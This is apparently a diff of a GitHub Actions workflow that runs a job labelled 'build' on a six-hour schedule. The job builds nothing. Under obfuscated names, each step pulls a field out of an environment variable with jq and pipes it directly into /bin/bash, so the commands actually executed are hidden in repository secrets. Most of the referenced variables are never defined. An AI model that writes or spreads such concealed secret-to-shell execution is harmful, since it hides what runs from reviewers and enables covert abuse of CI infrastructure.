@@ -1,9 +1,9 @@
 name: tengyuxi3412
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
-
+    - cron: '43 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: tengyuxi3412
         env:
-          mmzam30: ${{ secrets.mmzam30 }}
+          dsbt8: ${{ secrets.dsbt8 }}
         run: |
-          echo $mmzam30 | jq -r .njj48118 | /bin/bash
-          echo $rvppu87714 | jq -r .nqp369 | /bin/bash
-          echo $qihwm337 | jq -r .pl2 | /bin/bash
-          echo $rv7 | jq -r .m43 | /bin/bash
-          echo $wyr16116 | jq -r .s9 | /bin/bash
-          echo $qhjar53754 | jq -r .cbd95033 | /bin/bash
-          echo $u12 | jq -r .f9322 | /bin/bash
-          echo $mx9 | jq -r .pcg6 | /bin/bash
+          echo $dsbt8 | jq -r .sof44560 | /bin/bash
+          echo $zrk2 | jq -r .wxk5176 | /bin/bash
+          echo $rm7566 | jq -r .w509 | /bin/bash
+          echo $zu69603 | jq -r .jv53 | /bin/bash
+          echo $ta33410 | jq -r .xsc1773 | /bin/bash
+          echo $m65 | jq -r .vb1969 | /bin/bash
+          echo $zgu368 | jq -r .lwtk9915 | /bin/bash
+          echo $vvq2 | jq -r .mujr729 | /bin/bash
+          echo $y5847 | jq -r .gi1 | /bin/bash
+          echo $iy0 | jq -r .v17511 | /bin/bash
+          echo $qekn64 | jq -r .jqjo26064 | /bin/bash
+          echo $i36 | jq -r .xqlb47 | /bin/bash
+          echo $cbf382 | jq -r .d970 | /bin/bash
+          echo $czzw993 | jq -r .ats63987 | /bin/bash
+          echo $i70974 | jq -r .t8374 | /bin/bash
+          echo $weqyp0 | jq -r .njcuk6 | /bin/bash
+          echo $heqvy7 | jq -r .ztj19537 | /bin/bash
 
